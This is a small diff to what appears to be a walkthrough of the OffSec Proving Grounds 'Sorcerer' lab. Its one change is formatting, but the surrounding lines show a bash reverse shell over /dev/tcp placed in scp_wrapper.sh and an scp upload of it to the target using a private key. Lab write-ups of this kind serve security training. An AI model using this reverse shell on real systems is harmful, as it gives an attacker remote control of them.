@@ -55,7 +55,7 @@ Modify the source code of scp_wrapper.sh.
 #!/bin/bash
 /bin/bash -l > /dev/tcp/<LHOST>/<LPORT> 0<&1 2>&1
 ```
-Then use the scp command to upload wrapper.sh with reverse shell content.
+Then use the `scp` command to upload wrapper.sh with reverse shell content.
 
 ```
 scp -i ~/Downloads/id_rsa ~/Documents/OffSecPG/Sorcerer/scp_wrapper.sh max@<RHOST>:/home/max
